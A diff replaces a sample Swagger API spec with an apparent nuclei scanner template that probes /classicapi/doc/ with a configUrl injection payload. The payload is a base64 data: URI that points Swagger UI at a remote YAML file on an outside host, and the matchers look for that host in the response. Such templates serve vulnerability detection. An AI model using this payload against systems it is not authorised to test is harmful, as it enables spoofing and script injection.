@@ -1,37 +1,29 @@
-swagger: "2.0"
+id: swagger_51pwn
+
 info:
-  title: Sample API
-  description: API description in Markdown.
-  version: 1.0.0
-host: localhost
-basePath: /v1
-schemes:
-  - https
-paths:
-  /users:
-    get:
-      summary: Returns a list of users.
-      description: Optional extended description in Markdown.
-      produces:
-        - application/json
-      responses:
-        200:
-          description: OK
-  /users/{userId}:
-    get:
-      summary: Returns a user by ID.
-      parameters:
-        - in: path
-          name: userId
-          required: true
-          type: integer
-          default: 1
-          description: Parameter description in Markdown.
-        - in: query
-          name: test
-          type: string
-          enum: [asc, desc]
-          description: Type of query
-      responses:
-        200:
-          description: OK
+  name: swagger api
+  author: 51pwn
+  severity: critical
+  description: |
+    swagger api
+
+requests:
+  - raw:
+      - |
+        GET /classicapi/doc/ HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ== HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: or
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        words:
+          - 'swagger.yaml'
+        condition: and
+      - type: word
+        words:
+          - 'exuberant-ice.surge.sh'
+        condition: and
